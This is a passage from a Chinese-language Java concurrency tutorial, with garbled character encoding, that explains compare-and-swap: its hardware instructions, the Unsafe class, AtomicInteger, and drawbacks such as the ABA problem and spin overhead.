<span class="hljs-bullet">3.</span> è¿”å›æ“ä½œç»“æœ
</code></pre>
<p><strong>ä¼ªä»£ç ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwap</span><span class="hljs-params">(<span class="hljs-type">int</span> V, <span class="hljs-type">int</span> A, <span class="hljs-type">int</span> B)</span> {
    <span class="hljs-keyword">if</span> (V == A) {        <span class="hljs-comment">// æ¯”è¾ƒï¼šå½“å‰å€¼æ˜¯å¦ç­‰äºé¢„æœŸå€¼ï¼Ÿ</span>
        V = B;           <span class="hljs-comment">// äº¤æ¢ï¼šæ›´æ–°ä¸ºæ–°å€¼</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;     <span class="hljs-comment">// æˆåŠŸ</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        <span class="hljs-comment">// å¤±è´¥ï¼Œè¿”å›å½“å‰å€¼</span>
}
</code></pre>
<p><strong>å®é™…è¿”å›å€¼ï¼š</strong></p>
<ul>
<li>æœ‰äº›CASå®ç°è¿”å›booleanï¼ˆæˆåŠŸ/å¤±è´¥ï¼‰</li>
<li>æœ‰äº›è¿”å›æ—§å€¼ï¼ˆè®©ä½ çŸ¥é“å½“å‰çš„å®é™…å€¼ï¼‰</li>
</ul>
<h4 data-id="heading-100">CASçš„åŸå­æ€§ä¿è¯</h4>
<p><strong>ä¸ºä»€ä¹ˆCASæ˜¯åŸå­çš„ï¼Ÿ</strong></p>
<p>CASä¹‹æ‰€ä»¥æ˜¯åŸå­æ“ä½œï¼Œæ˜¯å› ä¸º<strong>CPUç›´æ¥æä¾›äº†åŸå­æ€§çš„CASæŒ‡ä»¤</strong>ã€‚è¿™ä¸æ˜¯Javaè¯­è¨€å±‚é¢çš„ç‰¹æ€§ï¼Œè€Œæ˜¯ç¡¬ä»¶å±‚é¢çš„æ”¯æŒã€‚</p>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ol>
<li><strong>CPUæŒ‡ä»¤çº§åˆ«</strong>ï¼šCASæ˜¯CPUçš„ä¸€æ¡æŒ‡ä»¤ï¼Œä¸€æ¡æŒ‡ä»¤çš„æ‰§è¡Œæ˜¯ä¸å¯åˆ†å‰²çš„</li>
<li><strong>ä¸ä¼šè¢«ä¸­æ–­</strong>ï¼šåœ¨æ‰§è¡ŒCASæŒ‡ä»¤æœŸé—´ï¼Œä¸ä¼šè¢«å…¶ä»–çº¿ç¨‹æˆ–æ“ä½œä¸­æ–­</li>
<li><strong>ç¡¬ä»¶ä¿è¯</strong>ï¼šè¿™æ˜¯ç¡¬ä»¶å±‚é¢çš„ä¿è¯ï¼Œæ¯”è½¯ä»¶å±‚é¢çš„é”æ›´åº•å±‚ã€æ›´é«˜æ•ˆ</li>
</ol>
<p><strong>åŸå­æ€§çš„é‡è¦æ€§ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ éåŸå­æ“ä½œï¼ˆä¸å®‰å…¨ï¼Œæœ‰ç«æ€æ¡ä»¶ï¼‰</span>
<span class="hljs-keyword">if</span> (value == expected) {
    value = newValue;  <span class="hljs-comment">// è¿™ä¸¤æ­¥ä¸æ˜¯åŸå­çš„</span>
    <span class="hljs-comment">// é—®é¢˜ï¼šåœ¨æ£€æŸ¥å’Œèµ‹å€¼ä¹‹é—´ï¼Œvalueå¯èƒ½è¢«å…¶ä»–çº¿ç¨‹ä¿®æ”¹</span>
}

<span class="hljs-comment">// âœ… CASåŸå­æ“ä½œï¼ˆå®‰å…¨ï¼‰</span>
compareAndSwap(value, expected, newValue);  
<span class="hljs-comment">// ä¸€æ­¥å®Œæˆï¼Œä¸ä¼šè¢«ä¸­æ–­ï¼ŒåŸå­æ€§ä¿è¯</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆæ™®é€šæ“ä½œä¸æ˜¯åŸå­çš„ï¼Ÿ</strong></p>
<ul>
<li>æ™®é€šæ“ä½œåŒ…å«å¤šä¸ªæ­¥éª¤ï¼ˆè¯»å–ã€æ¯”è¾ƒã€å†™å…¥ï¼‰</li>
<li>åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œè¿™äº›æ­¥éª¤ä¹‹é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æ‰“æ–­</li>
<li>å¯¼è‡´æ•°æ®ä¸ä¸€è‡´é—®é¢˜</li>
</ul>
<h4 data-id="heading-101">CPUåŸè¯­æ”¯æŒ</h4>
<p><strong>ä¸åŒCPUæ¶æ„çš„CASå®ç°ï¼š</strong></p>
<p><strong>x86/x64æ¶æ„ï¼ˆIntel/AMDï¼‰ï¼š</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">; CMPXCHGæŒ‡ä»¤ï¼ˆCompare and Exchangeï¼‰
CMPXCHG dest, src
; åŠŸèƒ½ï¼šæ¯”è¾ƒEAXå¯„å­˜å™¨ä¸­çš„å€¼å’Œdestï¼Œå¦‚æœç›¸ç­‰ï¼Œå°†srcå†™å…¥dest
; è¿™æ˜¯x86æ¶æ„æä¾›çš„åŸå­æŒ‡ä»¤
</code></pre>
<p><strong>ARMæ¶æ„ï¼ˆæ‰‹æœº/åµŒå…¥å¼è®¾å¤‡ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">; LDREX/STREXæŒ‡ä»¤å¯¹ï¼ˆLoad-Exclusive/Store-Exclusiveï¼‰
LDREX R1, [R0]        ; åŠ è½½å¹¶ç‹¬å è®¿é—®
CMP R1, R2            ; æ¯”è¾ƒ
STREXEQ R3, R4, [R0]  ; æ¡ä»¶å­˜å‚¨ï¼ˆå¦‚æœç‹¬å çŠ¶æ€è¿˜åœ¨ï¼‰
; é€šè¿‡ç‹¬å è®¿é—®æœºåˆ¶å®ç°åŸå­æ“ä½œ
</code></pre>
<p><strong>Javaä¸­çš„CASï¼š</strong></p>
<p>Javaé€šè¿‡<code>Unsafe</code>ç±»è°ƒç”¨åº•å±‚CPUæŒ‡ä»¤ï¼Œå¯¹å¼€å‘è€…æ¥è¯´æ˜¯é€æ˜çš„ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Unsafeç±»æä¾›CASæ–¹æ³•ï¼ˆåº•å±‚è°ƒç”¨CPUæŒ‡ä»¤ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapInt</span><span class="hljs-params">(
    Object o,     // å¯¹è±¡
    <span class="hljs-type">long</span> offset,  // å­—æ®µåç§»é‡ï¼ˆå†…å­˜åœ°å€ï¼‰
    <span class="hljs-type">int</span> expected, // é¢„æœŸå€¼
    <span class="hljs-type">int</span> x         // æ–°å€¼
)</span>;
<span class="hljs-comment">// è¿™ä¸ªæ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨CPUçš„CASæŒ‡ä»¤</span>
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>Javaä»£ç  â†’ Unsafeç±» â†’ JVM â†’ CPUæŒ‡ä»¤</li>
<li>æœ€ç»ˆæ‰§è¡Œçš„æ˜¯CPUæä¾›çš„åŸå­æŒ‡ä»¤</li>
<li>å¼€å‘è€…ä¸éœ€è¦å…³å¿ƒåº•å±‚å®ç°ç»†èŠ‚</li>
</ul>
<h3 data-id="heading-102">5.2 CASçš„å®ç°</h3>
<h4 data-id="heading-103">Unsafeç±»</h4>
<p><strong>Unsafeç±»æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p><code>Unsafe</code>ç±»æ˜¯Javaæä¾›çš„ä¸€ä¸ª"åé—¨"ç±»ï¼Œç”¨äºæ‰§è¡Œä¸€äº›ä¸å®‰å…¨çš„åº•å±‚æ“ä½œã€‚å®ƒçš„åå­—å°±è¯´æ˜äº†å®ƒçš„ç‰¹æ€§â€”â€”unsafeï¼ˆä¸å®‰å…¨ï¼‰ã€‚</p>
<p><strong>Unsafeç±»çš„ä½œç”¨ï¼š</strong></p>
<ul>
<li>âœ… <strong>ç›´æ¥æ“ä½œå†…å­˜</strong>ï¼šå¯ä»¥åƒCè¯­è¨€ä¸€æ ·ç›´æ¥è¯»å†™å†…å­˜</li>
<li>âœ… <strong>æä¾›CASæ–¹æ³•</strong>ï¼šcompareAndSwapIntã€compareAndSwapLongç­‰</li>
<li>âœ… <strong>ç»•è¿‡å®‰å…¨æ£€æŸ¥</strong>ï¼šå¯ä»¥åšä¸€äº›æ­£å¸¸æƒ…å†µä¸‹ä¸å…è®¸çš„æ“ä½œ</li>
<li>âš ï¸ <strong>ä¸æ¨èç›´æ¥ä½¿ç”¨</strong>ï¼šå±äº<code>sun.misc</code>åŒ…ï¼Œä¸æ˜¯å…¬å¼€APIï¼Œå¯èƒ½åœ¨ä¸åŒJDKç‰ˆæœ¬ä¸­å˜åŒ–</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆå«Unsafeï¼Ÿ</strong></p>
<ul>
<li>å› ä¸ºå®ƒç»•è¿‡äº†Javaçš„å®‰å…¨æ£€æŸ¥æœºåˆ¶</li>
<li>ä½¿ç”¨ä¸å½“å¯èƒ½å¯¼è‡´JVMå´©æºƒ</li>
<li>åªæœ‰ç³»ç»Ÿä»£ç ï¼ˆå¦‚JUCåŒ…ï¼‰æ‰åº”è¯¥ä½¿ç”¨</li>
</ul>
<p><strong>è·å–Unsafeå®ä¾‹ï¼ˆä»…äº†è§£ï¼Œä¸è¦ç›´æ¥ä½¿ç”¨ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âš ï¸ æ³¨æ„ï¼šè¿™åªæ˜¯æ¼”ç¤ºï¼Œç”Ÿäº§ç¯å¢ƒä¸è¦è¿™æ ·åš</span>
<span class="hljs-keyword">import</span> sun.misc.Unsafe;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;

<span class="hljs-comment">// é€šè¿‡åå°„è·å–Unsafeå®ä¾‹</span>
<span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();

<span class="hljs-comment">// æ­£å¸¸å¼€å‘ä¸­ï¼Œåº”è¯¥ä½¿ç”¨AtomicIntegerç­‰å°è£…å¥½çš„ç±»</span>
<span class="hljs-comment">// è€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨Unsafe</span>
</code></pre>
<p><strong>å®é™…å¼€å‘å»ºè®®ï¼š</strong></p>
<ul>
<li>âŒ <strong>ä¸è¦ç›´æ¥ä½¿ç”¨Unsafeç±»</strong></li>
<li>âœ… <strong>ä½¿ç”¨AtomicIntegerã€AtomicLongç­‰å°è£…å¥½çš„åŸå­ç±»</strong></li>
<li>âœ… <strong>è¿™äº›åŸå­ç±»å†…éƒ¨å·²ç»ä½¿ç”¨äº†Unsafeï¼Œæä¾›å®‰å…¨çš„API</strong></li>
</ul>
<h4 data-id="heading-104">compareAndSwapInt/Long/Objectæ–¹æ³•</h4>
<p><strong>Unsafeæä¾›çš„CASæ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é’ˆå¯¹intç±»å‹çš„CAS</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapInt</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, <span class="hljs-type">int</span> expected, <span class="hljs-type">int</span> x)</span>;

<span class="hljs-comment">// é’ˆå¯¹longç±»å‹çš„CAS</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapLong</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, <span class="hljs-type">long</span> expected, <span class="hljs-type">long</span> x)</span>;

<span class="hljs-comment">// é’ˆå¯¹å¯¹è±¡å¼•ç”¨çš„CAS</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapObject</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, Object expected, Object x)</span>;
</code></pre>
<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>Object o</code>ï¼šåŒ…å«è¦æ›´æ–°å­—æ®µçš„å¯¹è±¡</li>
<li><code>long offset</code>ï¼šå­—æ®µåœ¨å¯¹è±¡ä¸­çš„å†…å­˜åç§»é‡ï¼ˆå¯ä»¥ç†è§£ä¸ºå­—æ®µçš„"åœ°å€"ï¼‰</li>
<li><code>expected</code>ï¼šæœŸæœ›çš„æ—§å€¼</li>
<li><code>x</code>ï¼šè¦è®¾ç½®çš„æ–°å€¼</li>
</ul>
<p><strong>å®é™…ä½¿ç”¨ï¼ˆç®€åŒ–ç¤ºä¾‹ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®é™…å¼€å‘ä¸­ï¼Œä¸éœ€è¦è‡ªå·±å®ç°ï¼Œç›´æ¥ä½¿ç”¨AtomicIntegerå³å¯</span>
<span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// incrementAndGetå†…éƒ¨å°±æ˜¯ä½¿ç”¨CASå®ç°çš„</span>
count.incrementAndGet();  

<span class="hljs-comment">// ç­‰ä»·äºä»¥ä¸‹é€»è¾‘ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</span>
<span class="hljs-comment">// do {</span>
<span class="hljs-comment">//     current = count.get();</span>
<span class="hljs-comment">//     next = current + 1;</span>
<span class="hljs-comment">// } while (!count.compareAndSet(current, next));</span>
</code></pre>
<p><strong>æ–¹æ³•å¯¹æ¯”ï¼š</strong></p>
<ul>
<li><strong>compareAndSwapInt</strong>ï¼šç”¨äºintç±»å‹ï¼ˆ32ä½ï¼‰</li>
<li><strong>compareAndSwapLong</strong>ï¼šç”¨äºlongç±»å‹ï¼ˆ64ä½ï¼‰</li>
<li><strong>compareAndSwapObject</strong>ï¼šç”¨äºå¯¹è±¡å¼•ç”¨</li>
</ul>
<h4 data-id="heading-105">CASçš„åº•å±‚å®ç°ï¼ˆäº†è§£å³å¯ï¼‰</h4>
<p><strong>x86æ¶æ„ä¸‹çš„å®ç°åŸç†ï¼š</strong></p>
<p>JVMçš„HotSpotè™šæ‹Ÿæœºåœ¨x86æ¶æ„ä¸‹ï¼ŒCASæœ€ç»ˆä¼šç¼–è¯‘æˆCPUæŒ‡ä»¤ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// HotSpotæºç ï¼ˆç®€åŒ–ç‰ˆï¼Œäº†è§£å³å¯ï¼‰</span>
<span class="hljs-keyword">inline</span> jint <span class="hljs-title function_">Atomic::cmpxchg</span><span class="hljs-params">(...)</span> {
    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(
        <span class="hljs-string">"lock cmpxchgl %1,(%3)"</span>  <span class="hljs-comment">// å…³é”®ï¼šlockå‰ç¼€ + CMPXCHGæŒ‡ä»¤</span>
        ...
    )</span>;
}
</code></pre>
<p><strong>å…³é”®ç‚¹è§£æï¼š</strong></p>
<ol>
<li>
<p><strong>lockå‰ç¼€</strong>ï¼š</p>
<ul>
<li>é”å®šCPUæ€»çº¿æˆ–ç¼“å­˜è¡Œ</li>
<li>ç¡®ä¿åªæœ‰ä¸€ä¸ªCPUæ ¸å¿ƒèƒ½æ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤</li>
<li>ä¿è¯åŸå­æ€§</li>
</ul>
</li>
<li>
<p><strong>cmpxchglæŒ‡ä»¤</strong>ï¼š</p>
<ul>
<li>x86æ¶æ„çš„æ¯”è¾ƒå¹¶äº¤æ¢æŒ‡ä»¤</li>
<li>ä¸€æ¡æŒ‡ä»¤å®Œæˆæ¯”è¾ƒå’Œäº¤æ¢</li>
<li>ç¡¬ä»¶çº§åˆ«çš„åŸå­æ“ä½œ</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜å±éšœ</strong>ï¼š</p>
<ul>
<li>ä¿è¯å¯è§æ€§ï¼ˆå…¶ä»–CPUèƒ½çœ‹åˆ°æ›´æ–°ï¼‰</li>
<li>é˜²æ­¢æŒ‡ä»¤é‡æ’åº</li>
</ul>
</li>
</ol>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>Javaä»£ç  â†’ JVM â†’ CPUæŒ‡ä»¤ï¼ˆlock cmpxchglï¼‰</li>
<li>ä¸€æ¡CPUæŒ‡ä»¤å®Œæˆï¼Œä¸ä¼šè¢«ä¸­æ–­</li>
<li>ç¡¬ä»¶ä¿è¯åŸå­æ€§ï¼Œéå¸¸é«˜æ•ˆ</li>
</ul>
<h3 data-id="heading-106">5.3 CASçš„ä¼˜ç¼ºç‚¹</h3>
<h4 data-id="heading-107">ä¼˜ç‚¹ï¼šæ— é”ã€é«˜æ€§èƒ½</h4>
<p><strong>æ— é”çš„ä¼˜åŠ¿ï¼š</strong></p>
<ol>
<li>
<p><strong>é¿å…çº¿ç¨‹é˜»å¡å’Œå”¤é†’çš„å¼€é”€</strong></p>
<ul>
<li>synchronizedä¼šè®©çº¿ç¨‹è¿›å…¥é˜»å¡çŠ¶æ€ï¼Œéœ€è¦æ“ä½œç³»ç»Ÿå”¤é†’</li>
<li>CASå¤±è´¥ååªæ˜¯è‡ªæ—‹é‡è¯•ï¼Œçº¿ç¨‹ä¸ä¼šé˜»å¡</li>
<li>å‡å°‘äº†ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€</li>
</ul>
</li>
<li>
<p><strong>é¿å…æ­»é”</strong></p>
<ul>
<li>CASä¸éœ€è¦è·å–é”ï¼Œä¸ä¼šå‡ºç°æ­»é”é—®é¢˜</li>
<li>éå¸¸é€‚åˆåœ¨é«˜å¹¶å‘åœºæ™¯ä½¿ç”¨</li>
</ul>
</li>
<li>
<p><strong>é€‚åˆä½ç«äº‰åœºæ™¯</strong></p>
<ul>
<li>å½“å¤šä¸ªçº¿ç¨‹ç«äº‰ä¸æ¿€çƒˆæ—¶ï¼ŒCASæ€§èƒ½éå¸¸å¥½</li>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹CASéƒ½èƒ½æˆåŠŸï¼Œä¸éœ€è¦é‡è¯•</li>
</ul>
</li>
</ol>
<p><strong>æ€§èƒ½å¯¹æ¯”ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ synchronizedæ–¹å¼ï¼ˆæœ‰é”ï¼Œä¼šé˜»å¡ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// è·å–é”ï¼Œå¯èƒ½é˜»å¡ç­‰å¾…</span>
}

<span class="hljs-comment">// âœ… CASæ–¹å¼ï¼ˆæ— é”ï¼Œè‡ªæ—‹é‡è¯•ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();  
    <span class="hljs-comment">// å†…éƒ¨å®ç°ï¼šè‡ªæ—‹é‡è¯•ï¼Œä¸é˜»å¡</span>
    <span class="hljs-comment">// do {</span>
    <span class="hljs-comment">//     current = count.get();</span>
    <span class="hljs-comment">// } while (!count.compareAndSet(current, current + 1));</span>
}
</code></pre>
<p><strong>æ€§èƒ½å¯¹æ¯”æ€»ç»“ï¼š</strong></p>

























<table><thead><tr><th>åœºæ™¯</th><th>CAS</th><th>synchronized</th></tr></thead><tbody><tr><td><strong>ä½ç«äº‰</strong></td><td>âœ… æ€§èƒ½å¾ˆå¥½ï¼ˆå¤§å¤šæ•°æˆåŠŸï¼Œå¾ˆå°‘é‡è¯•ï¼‰</td><td>âš ï¸ æ€§èƒ½ç¨å·®ï¼ˆæœ‰é”å¼€é”€ï¼‰</td></tr><tr><td><strong>é«˜ç«äº‰</strong></td><td>âš ï¸ æ€§èƒ½ä¸‹é™ï¼ˆå¤§é‡è‡ªæ—‹é‡è¯•ï¼ŒCPUæ¶ˆè€—é«˜ï¼‰</td><td>âœ… æ€§èƒ½æ›´å¥½ï¼ˆé˜»å¡ç­‰å¾…ï¼ŒèŠ‚çœCPUï¼‰</td></tr><tr><td><strong>æ¨èåœºæ™¯</strong></td><td>è¯»å¤šå†™å°‘ã€ç«äº‰ä¸æ¿€çƒˆ</td><td>ç«äº‰æ¿€çƒˆã€éœ€è¦äº’æ–¥è®¿é—®</td></tr></tbody></table>
<h4 data-id="heading-108">ç¼ºç‚¹ï¼šABAé—®é¢˜ã€è‡ªæ—‹å¼€é”€ã€åªèƒ½ä¿è¯ä¸€ä¸ªå˜é‡çš„åŸå­æ€§</h4>
<h5 data-id="heading-109">ABAé—®é¢˜</h5>
<p><strong>ä»€ä¹ˆæ˜¯ABAé—®é¢˜ï¼Ÿ</strong></p>
<p>ABAé—®é¢˜æ˜¯æŒ‡ï¼šå€¼ä»Aå˜æˆBï¼Œå†å˜å›Aï¼ŒCASä»ç„¶è®¤ä¸ºå€¼æ²¡æœ‰è¢«ä¿®æ”¹è¿‡ã€‚</p>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>ä½ ç¦»å¼€æ—¶çœ‹åˆ°æ¡Œä¸Šæœ‰ä¸ªè‹¹æœï¼ˆAï¼‰</li>
<li>ä½ å›æ¥æ—¶æ¡Œä¸Šè¿˜æ˜¯è‹¹æœï¼ˆAï¼‰</li>
<li>ä½†å®é™…ä¸Šè¿™ä¸ªè‹¹æœå¯èƒ½è¢«æ¢è¿‡äº†ï¼ˆåŸæ¥çš„è¢«åƒäº†ï¼Œæ”¾äº†ä¸ªæ–°çš„ï¼‰</li>
<li>CASåªæ£€æŸ¥å€¼æ˜¯å¦ç›¸åŒï¼Œæ— æ³•å‘ç°"è¢«æ¢è¿‡"è¿™ä¸ªäº‹å®</li>
</ul>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile">æ—¶é—´çº¿ï¼š
<span class="hljs-section">T1: çº¿ç¨‹1è¯»å–å€¼ = A</span>
<span class="hljs-section">T2: çº¿ç¨‹2ä¿®æ”¹å€¼ï¼šA -&gt; B</span>
<span class="hljs-section">T3: çº¿ç¨‹2ä¿®æ”¹å€¼ï¼šB -&gt; Aï¼ˆåˆæ”¹å›æ¥äº†ï¼‰</span>
<span class="hljs-section">T4: çº¿ç¨‹1æ‰§è¡ŒCAS(A, C)</span>
    ç»“æœï¼šCASæˆåŠŸï¼ä½†å®é™…ä¸Šå€¼å·²ç»è¢«ä¿®æ”¹è¿‡äº†
</code></pre>
<p><strong>ç¤ºä¾‹ä»£ç ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>);

<span class="hljs-comment">// çº¿ç¨‹1ï¼šå‡†å¤‡å°†Aæ”¹ä¸ºC</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">String</span> <span class="hljs-variable">old</span> <span class="hljs-operator">=</span> ref.get();  <span class="hljs-comment">// è¯»å–"A"</span>
    Thread.sleep(<span class="hljs-number">1000</span>);      <span class="hljs-comment">// ç­‰å¾…1ç§’</span>
    <span class="hljs-comment">// æ­¤æ—¶å€¼å¯èƒ½å·²ç»è¢«çº¿ç¨‹2æ”¹è¿‡ï¼Œä½†CASä»ç„¶æˆåŠŸ</span>
    ref.compareAndSet(old, <span class="hljs-string">"C"</span>);  <span class="hljs-comment">// æˆåŠŸï¼ä½†å¯èƒ½ä¸æ˜¯æœŸæœ›çš„ç»“æœ</span>
});

<span class="hljs-comment">// çº¿ç¨‹2ï¼šA -&gt; B -&gt; A</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    ref.compareAndSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>);  <span class="hljs-comment">// A -&gt; B</span>
    ref.compareAndSet(<span class="hljs-string">"B"</span>, <span class="hljs-string">"A"</span>);  <span class="hljs-comment">// B -&gt; Aï¼ˆåˆæ”¹å›æ¥äº†ï¼‰</span>
});

t1.start();
t2.start();
</code></pre>
<p><strong>ABAé—®é¢˜çš„å±å®³ï¼š</strong></p>
<ul>
<li>åœ¨æ ˆã€é“¾è¡¨ç­‰æ•°æ®ç»“æ„ä¸­ï¼Œå¯èƒ½å¯¼è‡´é€»è¾‘é”™è¯¯</li>
<li>è™½ç„¶å€¼ç›¸åŒï¼Œä½†å¯¹è±¡å¯èƒ½å·²ç»è¢«æ›¿æ¢è¿‡</li>
<li>éœ€è¦é¢å¤–çš„ç‰ˆæœ¬å·æˆ–æ ‡è®°æ¥æ£€æµ‹</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ç‰ˆæœ¬å·ï¼šæ¯æ¬¡ä¿®æ”¹ç‰ˆæœ¬å·+1ï¼ˆAtomicStampedReferenceï¼‰</li>
<li>ä½¿ç”¨æ ‡è®°ä½ï¼šæ ‡è®°æ˜¯å¦è¢«ä¿®æ”¹è¿‡ï¼ˆAtomicMarkableReferenceï¼‰</li>
</ul>
<h5 data-id="heading-110">è‡ªæ—‹å¼€é”€</h5>
<p><strong>é—®é¢˜æè¿°ï¼š</strong></p>
<p>CASå¤±è´¥åä¼šä¸æ–­é‡è¯•ï¼ˆè‡ªæ—‹ï¼‰ï¼Œåœ¨é«˜ç«äº‰åœºæ™¯ä¸‹ä¼šæµªè´¹CPUã€‚</p>
<p><strong>å…·ä½“è¡¨ç°ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// CASè‡ªæ—‹è¿‡ç¨‹ï¼ˆä¼ªä»£ç ï¼‰</span>
<span class="hljs-keyword">do</span> {
    current = value;  <span class="hljs-comment">// è¯»å–å½“å‰å€¼</span>
    next = current + <span class="hljs-number">1</span>;
} <span class="hljs-keyword">while</span> (!compareAndSet(current, next));  
<span class="hljs-comment">// å¦‚æœä¸€ç›´å¤±è´¥ï¼Œä¼šä¸€ç›´å¾ªç¯ï¼ˆè‡ªæ—‹ï¼‰ï¼Œæ¶ˆè€—CPU</span>
</code></pre>
<p><strong>é—®é¢˜ï¼š</strong></p>
<ul>
<li>âš ï¸ <strong>CPUæ¶ˆè€—é«˜</strong>ï¼šè‡ªæ—‹ä¼šæŒç»­å ç”¨CPUï¼Œä¸åšå…¶ä»–å·¥ä½œ</li>
<li>âš ï¸ <strong>é«˜ç«äº‰æ—¶æ€§èƒ½ä¸‹é™</strong>ï¼šå¤§é‡çº¿ç¨‹åŒæ—¶CASï¼Œå¤±è´¥ç‡é«˜ï¼Œè‡ªæ—‹æ—¶é—´é•¿</li>
<li>âš ï¸ <strong>å¯èƒ½å¯¼è‡´CPU 100%</strong>ï¼šæ‰€æœ‰çº¿ç¨‹éƒ½åœ¨è‡ªæ—‹ï¼ŒCPUæ»¡è½½ä½†æ•ˆç‡ä½</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li><strong>é™åˆ¶è‡ªæ—‹æ¬¡æ•°</strong>ï¼šè¶…è¿‡ä¸€å®šæ¬¡æ•°åæ”¾å¼ƒ</li>
<li><strong>è‡ªé€‚åº”è‡ªæ—‹</strong>ï¼šæ ¹æ®å†å²æˆåŠŸç‡åŠ¨æ€è°ƒæ•´è‡ªæ—‹æ¬¡æ•°</li>
<li><strong>è‡ªæ—‹å¤±è´¥åé˜»å¡</strong>ï¼šè‡ªæ—‹ä¸€æ®µæ—¶é—´åå¦‚æœè¿˜å¤±è´¥ï¼Œå°±é˜»å¡ç­‰å¾…</li>
</ol>
<p><strong>æ€§èƒ½å»ºè®®ï¼š</strong></p>
<ul>
<li>ä½ç«äº‰åœºæ™¯ï¼šä½¿ç”¨CASï¼ˆè‡ªæ—‹å¼€é”€å°ï¼‰</li>
<li>é«˜ç«äº‰åœºæ™¯ï¼šè€ƒè™‘ä½¿ç”¨é”ï¼ˆé˜»å¡ç­‰å¾…ï¼ŒèŠ‚çœCPUï¼‰</li>
</ul>
<h5 data-id="heading-111">åªèƒ½ä¿è¯ä¸€ä¸ªå˜é‡çš„åŸå­æ€§</h5>
<p><strong>é—®é¢˜æè¿°ï¼š</strong></p>
<p>CASåªèƒ½åŸå­åœ°æ›´æ–°ä¸€ä¸ªå˜é‡ã€‚å¦‚æœéœ€è¦å¯¹å¤šä¸ªå˜é‡è¿›è¡ŒåŸå­æ“ä½œï¼ŒCASæ— æ³•ç›´æ¥ä¿è¯ã€‚</p>
